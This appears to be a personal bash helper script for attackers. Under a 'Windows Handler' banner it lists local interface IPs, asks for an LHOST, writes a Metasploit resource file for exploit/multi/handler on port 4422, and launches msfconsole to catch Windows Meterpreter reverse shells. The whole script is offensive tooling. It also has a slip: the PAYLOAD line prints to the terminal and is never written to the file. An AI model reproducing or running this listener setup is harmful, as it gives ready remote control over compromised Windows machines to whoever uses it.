cat << "EOF"
 __      __.__            .___                   
/  \    /  \__| ____    __| _/______  _  ________
\   \/\/   /  |/    \  / __ |/  _ \ \/ \/ /  ___/
 \        /|  |   |  \/ /_/ (  <_> )     /\___ \ 
  \__/\  / |__|___|  /\____ |\____/ \/\_//____  >
       \/          \/      \/                 \/ 
  ___ ___                    .___.__                
 /   |   \_____    ____    __| _/|  |   ___________ 
/    ~    \__  \  /    \  / __ | |  | _/ __ \_  __ \
\    Y    // __ \|   |  \/ /_/ | |  |_\  ___/|  | \/
 \___|_  /(____  /___|  /\____ | |____/\___  >__|   
       \/      \/     \/      \/           \/         
EOF

echo --------------------
ifconfig wlan0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p' && echo Wlan0 && echo --------------------
ifconfig vboxnet0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p' && echo vboxnet0 && echo --------------------
ifconfig tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p' && echo tun0 && echo --------------------
echo --------------------

touch ~/Desktop/Tools/metasp/meterpreter.rc
echo use exploit/multi/handler > ~/Desktop/Tools/metasp/meterpreter.rc
echo set PAYLOAD windows/meterpreter/reverse_tcp
read -p 'Set LHOST IP: ' uservar
echo set LHOST $uservar >> ~/Desktop/Tools/metasp/meterpreter.rc
echo set LPORT 4422 >> ~/Desktop/Tools/metasp/meterpreter.rc
echo set ExitOnSession false >> ~/Desktop/Tools/metasp/meterpreter.rc
echo exploit -j -z >> ~/Desktop/Tools/metasp/meterpreter.rc
echo run >> ~/Desktop/Tools/metasp/meterpreter.rc
cat ~/Desktop/Tools/metasp/meterpreter.rc
sudo msfconsole -r ~/Desktop/Tools/metasp/meterpreter.rc
